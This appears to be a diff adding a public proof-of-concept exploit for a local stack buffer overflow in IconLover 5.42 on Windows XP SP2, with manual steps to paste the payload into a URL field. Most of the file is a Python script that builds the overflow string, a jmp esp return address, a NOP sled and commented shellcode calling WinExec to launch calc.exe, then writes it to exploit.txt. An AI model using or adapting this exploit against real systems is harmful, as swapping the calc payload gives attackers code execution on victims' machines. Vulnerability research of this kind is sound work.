@@ -1,0 +1,61 @@
+# Exploit Title: IconLover v5.42 Buffer Overflow Exploit
+# Date: 29/09/2015
+# Exploit Author: cor3sm4sh3r
+# Author email: cor3sm4sh3r[at]gmail.com
+# Contact: https://in.linkedin.com/in/cor3sm4sh3r
+# Twitter: https://twitter.com/cor3sm4sh3r
+# Category: Local
+# Tested : win XP professional sp2 
+
+
+'''
+Credits & Authors:
+==================
+ZwX (http://zwx.fr/)
+[http://www.vulnerability-lab.com/show.php?user=ZwX]
+
+#References (Source):
+http://www.vulnerability-lab.com/get_content.php?id=1609
+
+Affected Product(s):
+====================
+AHA-Soft
+Product: IconLover - Software (Windows) 5.42 and 5.45
+
+
+Manual steps to exploit...
+1. Copy the content of  exploit.txt to your clipboard
+2. Run the IconLover.exe software
+3. Click the File -> New Icon Lybrary option
+4. Click the Lybrary and push the Download button
+5. Paste it the input Website Adress (URL) AAAA+... string click ok and hide
+6. Successful exploitation will open an instance of calc.exe!
+ 
+'''
+
+
+#!/usr/bin/env python
+#badchars = "\x00\x0a\x0d"
+junk  = "\x41" * 1039
+eip  = "\xed\x1e\x94\x7c"    #jmp esp 7c941eed ntdll.dll ( XP sp2 )
+nopsled ="\x90"*20
+
+shellcode  = "\x33\xc0"             #=> XOR EAX,EAX          |  Zero out EAX register
+shellcode += "\x50"                 #=> PUSH EAX             |  Push EAX to have null-byte padding for "calc.exe"
+shellcode += "\x68\x2E\x65\x78\x65" #=> PUSH ".exe"          |  Push The ASCII string to the stack
+shellcode += "\x68\x63\x61\x6C\x63" #=> PUSH "calc"          |
+shellcode += "\x8B\xC4"             #=> MOV EAX,ESP          |  Put a pointer to the ASCII string in EAX
+shellcode += "\x6A\x01"             #=> PUSH 1               |  Push uCmdShow parameter to the stack
+shellcode += "\x50"                 #=> PUSH EAX             |  Push the pointer to lpCmdLine to the stack
+shellcode += "\xBB\x4d\x11\x86\x7C" #=> MOV EBX,7C86114d     |  Move the pointer to WinExec() into EBX
+shellcode += "\xFF\xD3"             #=> CALL EBX    
+shellcode += "\x33\xc0"             #=> XOR EAX,EAX          |  Zero out EAX register
+shellcode += "\x50"                 #=> PUSH EAX             |  Push EAX
+shellcode += "\xBB\xa2\xca\x81\x7c" #=> MOV EBX,7C81caa2     |  Exit process
+shellcode += "\xFF\xD3"             #=> CALL EBX
+
+packet = junk + eip + nopsled + shellcode + nopsled
+
+file=open('exploit.txt','w')
+file.write(packet)
+file.close()
